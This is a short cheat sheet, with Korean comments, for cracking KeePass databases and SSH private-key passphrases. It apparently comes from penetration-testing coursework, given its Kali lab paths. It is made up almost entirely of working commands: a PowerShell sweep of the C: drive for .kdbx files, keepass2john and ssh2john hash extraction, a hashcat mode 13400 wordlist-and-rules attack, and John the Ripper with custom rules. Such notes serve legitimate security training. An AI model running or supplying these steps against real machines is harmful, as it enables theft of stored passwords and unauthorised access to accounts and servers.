# KeePass Password Cracking

``` powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

- C 드라이브 전체에서 `.kdbx` 확장자를 가진 파일을 재귀적으로 검색.
- `-ErrorAction SilentlyContinue` 옵션은 접근 권한 오류 메시지를 숨김.

``` bash
keepass2john Database.kdbx > keepass.hash
```
``` bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```
```
login with master password
```

---
 
# SSH Private Key Passphrase Cracking

``` bash
ssh2john id_rsa > ssh.hash
```
``` bash
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
```
``` bash
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

---
